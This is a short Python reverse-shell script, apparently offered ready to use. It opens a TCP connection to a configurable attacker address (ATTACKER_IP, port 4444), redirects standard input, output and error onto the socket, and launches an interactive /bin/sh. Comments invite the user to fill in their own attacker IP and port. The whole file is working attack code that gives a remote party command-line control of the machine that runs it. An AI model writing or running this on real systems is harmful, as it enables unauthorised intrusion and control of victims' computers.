import socket
import subprocess
import os

# Change this to your attacker's IP and port
ATTACKER_IP = "172.17.0.2"  # Set your IP
ATTACKER_PORT = 4444        # Set your port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
